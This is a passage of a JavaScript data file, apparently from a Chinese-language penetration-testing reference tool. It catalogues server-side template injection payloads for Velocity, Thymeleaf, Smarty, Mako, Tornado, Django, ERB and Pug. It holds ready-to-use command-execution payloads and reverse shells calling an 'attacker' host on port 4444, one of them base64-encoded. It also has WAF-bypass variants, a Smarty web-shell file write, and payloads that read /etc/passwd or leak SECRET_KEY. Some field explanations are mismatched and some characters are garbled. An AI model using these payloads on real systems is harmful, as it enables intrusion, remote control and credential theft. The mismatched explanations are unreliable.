          { part: '$class.inspect', explanation: '检查类信息' },
          { part: 'java.lang.Runtime', explanation: 'Java Runtime类' }
        ]
      },
      { 
        title: '3. 命令执行 - ClassTool', 
        command: '#set($rt=$class.inspect("java.lang.Runtime"))\n#set($chr=$class.inspect("java.lang.Character"))\n#set($ex=$rt.getRuntime().exec("id"))\n$ex.waitFor()\n#set($is=$ex.getInputStream())\n#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))\n#set($line=$br.readLine())\n$line', 
        description: '使用ClassTool执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$class.inspect', explanation: '获取类对象' },
          { part: 'getRuntime()', explanation: '获取Runtime实例' },
          { part: 'exec()', explanation: '执行命令' }
        ]
      },
      { 
        title: '4. 命令执行 - 反射', 
        command: '#set($rt=$Class.forName("java.lang.Runtime"))\n#set($m=$rt.getDeclaredMethod("getRuntime"))\n#set($obj=$m.invoke(null))\n#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))', 
        description: '使用反射执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$Class.forName', explanation: '加载类' },
          { part: 'getDeclaredMethod', explanation: '获取方法' },
          { part: 'invoke', explanation: '调用方法' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '#set($rt=$Class.forName("java.lang.Runtime"))\n#set($m=$rt.getDeclaredMethod("getRuntime"))\n#set($obj=$m.invoke(null))\n#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))',
            syntaxBreakdown: [
              { part: '#set($rt=$Class.forName("java.lang.Runtime"))\n#set($m=$rt.getDeclaredMethod("getRuntime"))\n#set($obj=$m.invoke(null))\n#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash', explanation: '命令/载荷起始', type: 'command' },
              { part: ' -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '#set($cmd="i"+"d")\n#set($rt=$Class.forName("java.lang.Ru"+"ntime"))\n#set($ex=$rt.getRuntime().exec($cmd))',
            syntaxBreakdown: [
              { part: '#set($cmd="i"+"d")\n#set($rt=$Class.forName("java.lang.Ru"+"ntime"))\n#set($ex=$', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用字符串拼接绕过', 
        platform: 'all'
      },
      { 
        title: '使用Unicode', 
        command: '#set($cmd="\u0069\u0064")\n#set($rt=$Class.forName("java.lang.Runtime"))\n#set($ex=$rt.getRuntime().exec($cmd))', 
        description: '使用Unicode编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\\u0069\\u0064', explanation: 'id的Unicode编码' }
        ]
      }
    ],
    tutorial: {
      overview: 'Apache Velocity是Java的轻量级模板引擎，SSTI漏洞可通过反射机制调用Java Runtime类执行系统命令。Velocity在Atlassian产品(Confluence/Jira)中广泛使用，相关漏洞影响面极大。',
      vulnerability: 'Velocity SSTI通过#set指令将变量绑定到Java类实例，再通过反射链(Class.forName/getMethod/invoke)访问Runtime.getRuntime().exec()执行命令。Velocity的宏和$引用机制使得构造利用链相对简单。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Velocity引擎\n3. 使用ClassTool或反射\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用ClassTool\n3. 使用沙箱环境\n4. 限制模板功能',
      difficulty: 'advanced'
    }
  },
  {
    id: 'ssti-thymeleaf',
    name: 'Thymeleaf模板注入',
    description: 'Thymeleaf模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Thymeleaf',
    tags: ['ssti', 'thymeleaf', 'java', 'spring', 'template'],
    prerequisites: ['使用Thymeleaf模板引擎', 'Spring框架', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '${7*7}\n#{7*7}\n*{7*7}\n[[${7*7}]]\n如果输出49，则存在SSTI', 
        description: '探测Thymeleaf模板注入', 
        platform: 'all',
      },
      { 
        title: '2. 信息收集', 
        command: '${T(java.lang.System).getenv()}\n${T(java.lang.Runtime).getRuntime().exec("id")}\n${T(java.lang.Class).forName("java.lang.Runtime")}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'T()', explanation: '访问Java类' },
          { part: 'getenv()', explanation: '获取环境变量' }
        ]
      },
      { 
        title: '3. 命令执行 - Spring表达式', 
        command: '${T(java.lang.Runtime).getRuntime().exec("id")}\n${T(java.lang.Runtime).getRuntime().exec("whoami")}\n${T(java.lang.ProcessBuilder).newInstance("id").start()}', 
        description: '使用Spring表达式执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'T(java.lang.Runtime)', explanation: '访问Runtime类' },
          { part: 'getRuntime()', explanation: '获取Runtime实例' },
          { part: 'exec()', explanation: '执行命令' }
        ]
      },
      { 
        title: '4. 命令执行 - ProcessBuilder', 
        command: '${new java.lang.ProcessBuilder(new String[]{"id"}).start()}\n${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}\n${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}', 
        description: '使用ProcessBuilder执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'new', explanation: '实例化对象' },
          { part: 'ProcessBuilder', explanation: 'Java进程构建器' },
          { part: 'start()', explanation: '启动进程' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}\n${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}',
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      },
      { 
        title: '使用反射', 
        command: '${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}',
        description: '使用反射绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'Runtime', explanation: '运行时执行', type: 'keyword' }
        ]
      },
      { 
        title: 'URL编码', 
        command: '${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}\n# 使用字节数组构造命令', 
        description: '使用字节数组绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'new byte[]{105,100}', explanation: 'id的ASCII字节' }
        ]
      }
    ],
    tutorial: {
      overview: 'Thymeleaf是Spring Boot默认的模板引擎，其SSTI漏洞常通过Spring表达式语言(SpEL)执行代码。在Spring MVC中，即使不在模板文件中，控制器返回值也可能触发模板解析导致注入。',
      vulnerability: 'Thymeleaf SSTI主要通过两种方式触发：1)预处理表达式__${expression}__在模板解析前执行SpEL 2)控制器返回用户可控的视图名触发模板解析。SpEL提供了访问Java类和执行方法的完整能力。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Thymeleaf引擎\n3. 使用T()访问Java类\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用SpEL表达式\n3. 使用安全的模板配置\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-smarty',
    name: 'Smarty模板注入',
    description: 'Smarty模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Smarty',
    tags: ['ssti', 'smarty', 'php', 'template'],
    prerequisites: ['使用Smarty模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '{$smarty.version}\n{7*7}\n{$smarty.template}\n如果输出版本或49，则存在SSTI', 
        description: '探测Smarty模板注入', 
        platform: 'all',
      },
      { 
        title: '2. 信息收集', 
        command: '{$smarty.server.PHP_SELF}\n{$smarty.server.SERVER_NAME}\n{$smarty.const.PHP_VERSION}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '$smarty.server', explanation: '服务器变量' },
          { part: '$smarty.const', explanation: 'PHP常量' }
        ]
      },
      { 
        title: '3. 命令执行 - system', 
        command: '{system("id")}\n{system("whoami")}\n{system("cat /etc/passwd")}', 
        description: '使用system函数执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: 'PHP系统命令执行函数' }
        ]
      },
      { 
        title: '4. 命令执行 - passthru', 
        command: '{passthru("id")}\n{passthru("ls -la")}\n{passthru("cat /etc/passwd")}', 
        description: '使用passthru函数执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'passthru()', explanation: 'PHP命令执行函数' }
        ]
      },
      { 
        title: '5. 命令执行 - exec', 
        command: '{exec("id",$output)}\n{foreach from=$output item=line}{$line}{/foreach}', 
        description: '使用exec函数执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'exec()', explanation: 'PHP命令执行函数' },
          { part: '$output', explanation: '输出数组' }
        ]
      },
      { 
        title: '6. 反弹Shell', 
        command: '{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}\n{system("nc -e /bin/sh attacker 4444")}', 
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '{system("i"+"d")}\n{system("who"."ami")}\n{system("ca"."t /etc/passwd")}',
            syntaxBreakdown: [
              { part: '{system("i"+"d")}\n{system("who"."ami")}\n{system("ca"."t', explanation: '命令/载荷起始', type: 'command' },
              { part: ' /etc/passwd")}', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '使用字符串拼接绕过', 
        platform: 'all'
      },
      { 
        title: '变量赋值', 
        command: '{assign var="cmd" value="id"}\n{system($cmd)}\n{assign var="f" value="sys"."tem"}\n{$f("id")}', 
        description: '使用变量赋值绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'assign', explanation: 'Smarty变量赋值' },
          { part: 'value', explanation: '变量值' }
        ]
      },
      { 
        title: '使用PHP函数', 
        command: '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}\n{PHP function call}',
        description: 'WAF绕过技术',
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Smarty是PHP最流行的模板引擎之一，其SSTI漏洞可通过{php}标签(旧版本)或{if}条件中的PHP函数调用实现代码执行，在PHP应用渗透测试中需重点关注。',
      vulnerability: 'Smarty SSTI利用方式因版本而异：旧版Smarty(3.x以下)支持{php}{/php}标签直接执行PHP代码；新版Smarty可通过{if}标签中调用system()/passthru()等函数，或使用{Smarty_Internal_Write_File}写入文件。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Smarty引擎\n3. 使用system/passthru执行命令\n4. 获取Shell',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用PHP函数调用\n3. 使用沙箱模式\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-mako',
    name: 'Mako模板注入',
    description: 'Mako模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Mako',
    tags: ['ssti', 'mako', 'python', 'template'],
    prerequisites: ['使用Mako模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '${7*7}\n${self}\n${self.module}\n如果输出49或模块信息，则存在SSTI', 
        description: '探测Mako模板注入', 
        platform: 'all',
      },
      { 
        title: '2. 信息收集', 
        command: '${self.module.cache.util}\n${self.module.cache.util.os}\n${dir(self)}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'self.module', explanation: '访问模板模块' },
          { part: 'dir()', explanation: '列出对象属性' }
        ]
      },
      { 
        title: '3. 命令执行 - os模块', 
        command: '${self.module.cache.util.os.popen("id").read()}\n${self.module.cache.util.os.popen("whoami").read()}\n${self.module.cache.util.os.system("id")}', 
        description: '使用os模块执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'os.popen()', explanation: '打开管道执行命令' },
          { part: '.read()', explanation: '读取输出' }
        ]
      },
      { 
        title: '4. 命令执行 - subprocess', 
        command: '<%\nimport subprocess\n%>\n${subprocess.check_output(["id","-a"])}\n${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}', 
        description: '使用subprocess执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<%', explanation: 'Mako Python代码块开始' },
          { part: '%>', explanation: '代码块结束' },
          { part: 'subprocess', explanation: 'Python子进程模块' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'os', explanation: '操作系统模块', type: 'keyword' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '${self.module.cache.util.os.popen("i"+"d").read()}\n${self.module.cache.util.os.popen("who"+"ami").read()}',
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'os', explanation: '操作系统模块', type: 'keyword' }
        ]
      },
      { 
        title: '使用__import__', 
        command: '${__import__("os").popen("id").read()}\n${__import__("subprocess").check_output(["id"])}', 
        description: '使用__import__导入模块', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '__import__', explanation: 'Python内置导入函数' }
        ]
      },
      { 
        title: '使用getattr', 
        command: '${getattr(__import__("os"),"popen")("id").read()}\n${getattr(getattr(__import__("os"),"popen")("id"),"read")()}',
        description: '使用getattr绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Mako是Python的高性能模板引擎，在Pylons/Pyramid框架中广泛使用。其SSTI漏洞可直接执行Python代码，因为Mako模板本质上会被编译为Python模块，安全边界较弱。',
      vulnerability: 'Mako SSTI的危害特别严重：模板中的${expression}直接执行Python表达式，<%块可包含任意Python代码，<%! %>定义模块级Python代码。攻击者无需复杂的利用链即可直接import os并执行系统命令。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Mako引擎\n3. 通过self.module访问os\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 限制模板功能\n3. 使用沙箱环境\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-tornado',
    name: 'Tornado模板注入',
    description: 'Tornado模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Tornado',
    tags: ['ssti', 'tornado', 'python', 'template'],
    prerequisites: ['使用Tornado模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '{{7*7}}\n{{handler}}\n{{request}}\n如果输出49或handler对象，则存在SSTI', 
        description: '探测Tornado模板注入', 
        platform: 'all',
      },
      { 
        title: '2. 信息收集', 
        command: '{{handler.settings}}\n{{handler.application}}\n{{request.headers}}\n{{request.cookies}}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'handler.settings', explanation: '应用配置' },
          { part: 'request.headers', explanation: 'HTTP�' }
        ]
      },
      { 
        title: '3. 命令执行 - os', 
        command: '{% import os %}\n{{os.popen("id").read()}}\n{{os.popen("whoami").read()}}\n{{os.system("id")}}', 
        description: '使用os模块执行命令', 
        platform: 'all',
      },
      { 
        title: '4. 命令执行 - subprocess', 
        command: '{% import subprocess %}\n{{subprocess.check_output(["id","-a"])}}\n{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}', 
        description: '使用subprocess执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'subprocess', explanation: 'Python子进程模块' },
          { part: 'check_output', explanation: '获取命令输出' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '{% import os %}\n{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'os', explanation: '操作系统模块', type: 'keyword' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '{% import os %}\n{{os.popen("i"+"d").read()}}\n{{os.popen("who"+"ami").read()}}',
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '{{}}', explanation: '模板表达式', type: 'technique' },
          { part: 'os', explanation: '操作系统模块', type: 'keyword' }
        ]
      },
      { 
        title: '使用__import__', 
        command: '{{__import__("os").popen("id").read()}}\n{{__import__("subprocess").check_output(["id"])}}',
        description: '使用__import__导入模块', 
        platform: 'all'
      },
      { 
        title: '使用handler', 
        command: '{{handler.application.settings}}\n{{handler.get_status()}}\n{{handler.request.remote_ip}}',
            syntaxBreakdown: [
              { part: '{{handler.application.settings}}\n{{handler.get_status()}}\n', explanation: '模板表达式注入', type: 'value' }
            ],
        description: '通过handler访问', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Tornado是Python的异步Web框架兼模板引擎，其SSTI漏洞可通过模板表达式执行Python代码。Tornado模板默认对输出进行HTML转义，但原始表达式{%raw%}和{{!expression}}可绕过。',
      vulnerability: 'Tornado模板SSTI通过{{}}表达式执行Python代码。攻击者可利用import语句导入模块，或通过handler对象(Tornado模板中的内置变量)访问application设置、cookie_secret等敏感信息，进而执行任意代码。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Tornado引擎\n3. 导入os模块\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用import语句\n3. 使用沙箱环境\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-django',
    name: 'Django模板注入',
    description: 'Django模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Django',
    tags: ['ssti', 'django', 'python', 'template'],
    prerequisites: ['使用Django模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '{{7*7}}\n{% if 1=1 %}vulnerable{% endif %}\n{{request}}\n如果输出49或request对象，则存在SSTI', 
        description: '探测Django模板注入', 
        platform: 'all',
      },
      { 
        title: '2. 信息收集', 
        command: '{{request.META}}\n{{request.user}}\n{{request.session}}\n{{settings.SECRET_KEY}}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'request.META', explanation: 'HTTP元数据' },
          { part: 'request.user', explanation: '当前用户' },
          { part: 'settings', explanation: 'Django配置' }
        ]
      },
      { 
        title: '3. 命令执行 - 通过settings', 
        command: '{{settings.TEMPLATES}}\n{{settings.DATABASES}}\n# Django模板默认沙箱，难以�接执行命令\n# 需要找到可利用的对象链', 
        description: '尝试通过settings访问', 
        platform: 'all'
      },
      { 
        title: '4. 命令执行 - 对象链', 
        command: '{{request.user.groups.model._meta.apps}}\n{{request.user.user_permissions.model._meta.apps}}\n# 尝试访问Django内部对象', 
        description: '通过对象链访问', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '_meta', explanation: 'Django模型元数据' },
          { part: 'apps', explanation: '应用注册表' }
        ]
      },
      { 
        title: '5. 敏感信息泄露', 
        command: '{{settings.SECRET_KEY}}\n{{settings.DATABASES}}\n{{settings.ALLOWED_HOSTS}}\n{{settings.DEBUG}}', 
        description: '泄露敏感配置', 
        },
      ],
    wafBypass: [
      { 
        title: '使用过滤器', 
        command: '{{request|length}}\n{{settings.SECRET_KEY|default:""}}\n{{request.META|dictsort:"key"}}', 
        description: '使用Django过滤器', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '|length', explanation: '长度过滤器' },
          { part: '|default', explanation: '默认值过滤器' }
        ]
      },
      { 
        title: '使用for循环', 
        command: '{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}\n{% for k in settings.keys %}{{k}}{% endfor %}',
        description: '使用for循环遍历', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Django模板引擎设计时就考虑了安全性，不支持直接执行Python代码。但在特定配置下(如DEBUG模式、自定义模板标签)仍可能存在SSTI漏洞，通过访问对象属性链泄露敏感信息。',
      vulnerability: 'Django SSTI虽然无法直接RCE，但可通过对象属性遍历泄露敏感信息：{{settings.SECRET_KEY}}获取密钥、{{settings.DATABASES}}获取数据库配置、通过已注册的模板变量(如request对象)访问HTTP头和session数据。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Django引擎\n3. 访问request/settings\n4. 泄露敏感配置\n5. 结合其他漏�利用',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用settings访问\n3. 使用autoescape\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-erb',
    name: 'ERB模板注入',
    description: 'ERB(Ruby)模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'ERB',
    tags: ['ssti', 'erb', 'ruby', 'template'],
    prerequisites: ['使用ERB模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '<%= 7*7 %>\n<%= self %>\n<%= __FILE__ %>\n如果输出49或文件信息，则存在SSTI', 
        description: '探测ERB模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<%=', explanation: 'ERB输出表达式' },
          { part: '7*7', explanation: '数学表达式' },
          { part: '%>', explanation: '表达式结束' }
        ]
      },
      { 
        title: '2. 信息收集', 
        command: '<%= Dir.pwd %>\n<%= ENV.inspect %>\n<%= `id` %>\n<%= File.read("/etc/passwd") %>', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Dir.pwd', explanation: '当前目录' },
          { part: 'ENV', explanation: '环境变量' },
          { part: '`id`', explanation: '反引号执行命令' }
        ]
      },
      { 
        title: '3. 命令执行 - 反引号', 
        command: '<%= `id` %>\n<%= `whoami` %>\n<%= `cat /etc/passwd` %>\n<%= `ls -la` %>', 
        description: '使用反引号执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '`', explanation: 'Ruby反引号执行系统命令' }
        ]
      },
      { 
        title: '4. 命令执行 - system', 
        command: '<%= system("id") %>\n<%= system("whoami") %>\n<%= exec("id") %>\n<%= IO.popen("id").read %>', 
        description: '使用system/exec执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: 'Ruby系统命令函数' },
          { part: 'exec()', explanation: '执行命令并替换进程' },
          { part: 'IO.popen', explanation: '打开管道' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '<%= `bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"` %>\n<%= system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"") %>', 
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '<%= `i` + `d` %>\n<%= system("wh"+"oami") %>\n<%= ("i"+"d").then { |c| system(c) } %>',
            syntaxBreakdown: [
              { part: '<%= `i` + `d` %>\n<%= system("wh"+"oami") %>\n<%= ("i"+"d").', explanation: '模板表达式注入', type: 'value' }
            ],
        description: '使用字符串拼接绕过', 
        platform: 'all'
      },
      { 
        title: '使用%语法', 
        command: '<%= %x(id) %>\n<%= %x{whoami} %>\n<%= %x[cat /etc/passwd] %>', 
        description: '使用%x语法执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%x()', explanation: 'Ruby命令执行语法' }
        ]
      },
      { 
        title: '使用Open3', 
        command: '<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>',
        description: '使用Open3模块', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '<%', explanation: '关键参数', type: 'value' },
          { part: 'require', explanation: '关键参数', type: 'value' },
          { part: '"open3";', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: 'ERB(Embedded Ruby)是Ruby标准库的模板引擎，在Ruby on Rails中广泛使用。ERB SSTI可直接执行Ruby代码，通过system()/exec()/反引号等方式执行系统命令，利用难度较低。',
      vulnerability: 'ERB SSTI通过<%= %>标签执行Ruby表达式，<% %>标签执行Ruby语句。攻击者可直接调用system()/exec()/IO.popen()/反引号执行系统命令，或通过File类读写服务器文件，利用链极为简单直接。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认ERB引擎\n3. 使用反引号执行命令\n4. 获取Shell',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 使用安全的模板引擎\n3. 限制模板功能\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'ssti-pug',
    name: 'Pug/Jade模板注入',
    description: 'Pug/Jade模板引擎注入攻击技术',
    category: 'SSTI模板注入',
    subCategory: 'Pug',
    tags: ['ssti', 'pug', 'jade', 'nodejs', 'template'],
    prerequisites: ['使用Pug/Jade模板引擎', '用户输入�接渲染到模板'],
    execution: [
      { 
        title: '1. 探测SSTI', 
        command: '#{7*7}\n#{this}\n#{global}\n如果输出49或global对象，则存在SSTI', 
        description: '探测Pug模板注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#{', explanation: 'Pug插值语法' },
          { part: '7*7', explanation: '数学表达式' },
          { part: '}', explanation: '插值结束' }
        ]
      },
      { 
        title: '2. 信息收集', 
        command: '#{process}\n#{process.env}\n#{global.process}\n#{require}', 
        description: '收集环境信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'process', explanation: 'Node.js进程对象' },
          { part: 'process.env', explanation: '环境变量' },
          { part: 'global', explanation: '全局对象' }
        ]
      },
      { 
        title: '3. 命令执行 - child_process', 
        command: '- var exec = require("child_process").exec\n#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}\n- require("child_process").exec("id")', 
        description: '使用child_process执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '-', explanation: 'Pug JavaScript代码行' },
          { part: 'require', explanation: 'Node.js模块加载' },
          { part: 'child_process', explanation: '子进程模块' }
        ]
      },
      { 
        title: '4. 命令执行 - execSync', 
        command: '- var execSync = require("child_process").execSync\n#{execSync("id").toString()}\n#{require("child_process").execSync("id").toString()}', 
        description: '使用execSync执行命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'execSync', explanation: '同步执行命令' },
          { part: 'toString()', explanation: 'Buffer转字符串' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'require("child_process").exec("bash', explanation: '关键参数', type: 'value' },
          { part: '-c', explanation: '关键参数', type: 'value' },
          { part: '\"bash', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '字符串拼接', 
        command: '- var cmd = "i" + "d"\n#{require("child_process").execSync(cmd).toString()}\n- var r = "require"\n#{global[r]("child_process")}',
        description: '使用字符串拼接绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'var', explanation: '关键参数', type: 'value' },
          { part: 'cmd', explanation: '关键参数', type: 'value' },
          { part: '"i"', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '使用global', 
        command: '#{global.process.mainModule.require("child_process").execSync("id").toString()}\n#{global["req"+"uire"]("child_process")}', 
        description: '使用global对象', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'mainModule', explanation: 'Node.js主模块' },
          { part: 'require', explanation: '模块加载函数' }
        ]
      },
      { 
        title: '使用this', 
        command: '#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}',
        description: '使用this.constructor', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '#{this.constructor.constructor("return', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    tutorial: {
      overview: 'Pug(原Jade)是Node.js生态最流行的模板引擎，其SSTI漏洞可通过JavaScript代码注入直接访问Node.js运行时环境，利用require()或child_process模块执行系统命令。',
      vulnerability: 'Pug SSTI通过未过滤的插值表达式(#{expression})或代码块(-/=前缀)执行JavaScript。攻击者可利用global.process.mainModule.require导入child_process模块，或通过constructor链(this.constructor.constructor)动态创建Function执行代码。',
      exploitation: '完�利用流程：\n1. 探测模板注入点\n2. 确认Pug引擎\n3. 使用require加载child_process\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 不要将用户输入�接渲染到模板\n2. 禁用require访问\n3. 使用沙箱环境\n4. 输入验证和过滤',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-basic',
    name: '本地文件包含',
    description: '本地文件包含漏�利用技术',
    category: 'LFI/RFI文件包含',
    subCategory: '本地包含',
